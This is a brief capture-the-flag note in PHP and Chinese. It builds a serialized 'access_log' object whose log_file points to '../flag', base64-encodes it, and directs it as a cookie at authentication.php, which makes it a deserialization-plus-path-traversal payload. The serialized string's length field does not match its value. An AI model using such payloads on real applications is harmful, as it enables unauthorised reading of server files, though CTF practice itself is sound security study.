```php
"access_log": {
    $log_file="../flag.txt"
}
serialize: O:10:"access_log":1:{s:8:"log_file";s:11:"../flag";}
base64+urlencode: TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

- 在authentication.php中发现的，记得把cookie发向它而非index